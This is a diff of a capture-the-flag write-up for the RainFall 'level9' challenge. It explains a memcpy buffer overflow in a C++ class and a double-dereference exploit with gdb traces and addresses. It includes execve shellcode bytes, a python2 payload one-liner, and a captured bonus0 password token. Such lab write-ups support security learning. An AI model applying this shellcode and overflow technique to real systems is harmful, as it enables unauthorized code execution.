@@ -3,19 +3,26 @@
 ## Understanding the Binary
 
 The `level9` binary is a C++ program that contains a class `N`. The `N` class has:
-- an `annotation` attribute of type `char*`
-- an `ammount` attribute of type `int`
+- an `annotation` attribute of type `char[]`
+- an `amount` attribute of type `int`
 - a method `setAnnotation(char*)`
-- an overloaded operator `+` that adds the `ammount` of another instance of the `N` class to the `ammount` of the current instance
-- an overloaded operator `-` that subtracts the `ammount` of another instance of the `N` class from the `ammount` of the current instance
+- an overloaded `+` operator that adds the `amount` of another instance of the `N` class to the `amount` of the current instance
+- an overloaded `-` operator that subtracts the `amount` of another instance of the `N` class from the `amount` of the current instance
 
 In the main function, two instances of the `N` class are created, and the `setAnnotation` method is called on one of
 them to add the user's input as an annotation. Then, the program calls the `operator+` method of one of the instances to
-add the `ammount` of the other instance to it.
+add the `amount` of the other instance to it.
+
+## The Vulnerability
+
+The `setAnnotation` method is vulnerable to a buffer overflow attack because it uses `memcpy` to copy the user input
+into `annotation` without checking the size of the input. Giving a long enough input will result in overwriting other
+memory locations.
 
 ## The offset 
 
-Using [pwndbg](https://github.com/pwndbg/pwndbg) we create an arbitrary long cyclic pattern of 120 characters.
+To find the offset at which the buffer overflow occurs, we can use a cyclic pattern. In this case, we use
+[pwndbg](https://github.com/pwndbg/pwndbg) to create an arbitrary long cyclic pattern of 120 characters.
 
 ```shell
 pwndbg> cyclic 120
@@ -39,7 +46,7 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 The program segfaults when it tries to dereference the invalid address `0x62616163`, which corresponds to the string
-`caab` which its part of our cyclic pattern. We find the offset of this string at the cyclic pattern using the
+`caab`, part of our cyclic pattern. We find the offset of this string in the cyclic pattern using the
 `cyclic -l` command.
 
 ```shell
@@ -48,10 +55,12 @@ Finding cyclic pattern of 4 bytes: b'caab' (hex: 0x63616162)
 Found at offset 108
 ```
 
+The offset is `108` bytes, which means that at this point in the input, we manage to overwrite some pointer
+
 ## The Double Dereference
 
-Putting a breakpoint after `setAnnotation` and rerunning the program with the same argument as before we see that the
-program copies the part of our cyclic pattern `caab` and stores in `eax` (<main+140>). Then it will attempt,
+Putting a breakpoint after `setAnnotation` (<main+136>) and rerunning the program with the same argument as before we
+see that the program copies the part of our cyclic pattern `caab` and stores in `eax` (<main+140>). Then it will attempt,
 unsuccessfully, to dereference `eax` once again and store the dereferenced value in `edx` (<main+142>). Finally, it
 makes a call to the dereferenced value stored in `edx` (<main+159>). Summarizing, we have a double dereference and an
 execution.
@@ -73,21 +82,52 @@ pwndbg> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaa
 ...SNIP...
 ```
 
-## The address of our argument
+## The strategy
 
-// TO CONTINUE HERE
+Instead of giving 'caab' as the first pointer, we will give the address of the second pointer, which in turn points to
+our shellcode.
 
+In terms of dereferencing, we will have:
+ptr1 → ptr2 → shellcode
+
+In the memory, we will have the following input string:
+
+| Ptr2       | Shellcode           | Padding                                     | Ptr1  |
+|------------|---------------------|---------------------------------------------|-------|
+| &Shellcode | \x00\x11\x22\x33... | "A" * (offset - len(Ptr2) - len(shellcode)) | &Ptr2 |
+
+In this way, our first pointer will be dereferenced once (<main+140>), and it will point to the second pointer, which
+will be dereferenced again (<main+142>), and it will point to the shellcode, which will be executed (<main+159>).
+
+## The Ptr2 address
+
+To assign the address of the second pointer to the first pointer, first we need to find the start address of our input.
+The idea is to point to our argument in the stack.
+
+Using `gdb`, we set a breakpoint just before the dereference of the first pointer occurs (<main+136>), and run the
+program with an arbitrary argument, for example `AAAA`. We print the value of `eax` after the breakpoint is hit, and we
+see that it contains the address of our argument on the stack. This will be the address of the second pointer and the 
+value that we will assign to the first pointer.
 
 ```shell
+level9@RainFall:~$ gdb ./level9 
+...SNIP...
+(gdb) b *0x0804867c
+Breakpoint 1 at 0x804867c
+(gdb) run AAAA
+Starting program: /home/user/level9/level9 AAAA
+
+Breakpoint 1, 0x0804867c in main ()
 (gdb) x/s $eax
 0x804a00c:       "AAAA"
 ```
-
 The address of the argument is `0x804a00c`, in little-endian is `\x0c\xa0\x04\x08`.
 
-We will also need the address of our argument + 4, so 0x804A010. In little-endian is `\x10\xa0\x04\x08`.
+## The address of the shellcode
 
-
+The shellcode will be placed right after the second pointer because its part of our argument and belongs to the same
+string. Since the size of the `ptr2` is 4 bytes, the address of the shellcode will be `0x804a00c + 4 = 0x804a010`.
+In little-endian is `\x10\xa0\x04\x08`. This is the value that we will asign to the second pointer.
 
 ### The Payload
 
@@ -123,12 +163,11 @@ sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31
 ipv
 ```
 
-
 ## Crafting the Exploit
 
 We create the exploit using python and save it to a file. The exploit consists of the following parts:
-- The address of our argument + 4 in little-endian: `\x10\xa0\x04\x08`
-- The payload
+- The address of the shellcode (our argument + 4) in little-endian: `\x10\xa0\x04\x08`
+- The shellcode
 - Padding to fill the rest of the buffer with 83 `A`s. 108 (offset) - 25 (all the previous bytes) = 83 
 - The address of our argument in little-endian: `\x0c\xa0\x04\x08`
 
@@ -138,9 +177,9 @@ python2 -c 'print "\x10\xa0\x04\x08\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\
 
 ## Running the Exploit
 
-Since we need to keep a terminal open to control the shell spawned involuntarily by the `level9` binary we craft the
-next command to read the exploit from a file and then from standard input. After sending a `SIGINT` or a `SIGQUIT` we
-are able to execute commands as `bonus0` user.
+Since we need to keep a terminal open to interact with the shell spawned by the `level9` binary, we craft the following 
+command to read the exploit from a file and then from standard input. After sending a `SIGINT` or `SIGQUIT`, we are able
+to execute commands as the `bonus0` user.
 
 ```shell
 level9@RainFall:~$ ./level9 "$(cat /tmp/exploit9 ; cat)"
@@ -157,18 +196,14 @@ $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
 
+## Some Useful Commands
 
-
-
-To know the rights of writing, read and execute the different memory segments, we can use the command:
-```shell
-shell cat /proc/$(pgrep level2)/maps
-```
-
+To print some lines of the disassembly after every next instruction, we can use:
 ```shell
 display/5i $pc-8
 ```
 
+To inspect that the exploit is correctly passed to the program, we can use:
 ```shell
 Breakpoint 2, 0x0804870e in N::setAnnotation(char*) ()
 (gdb) p $esp+8
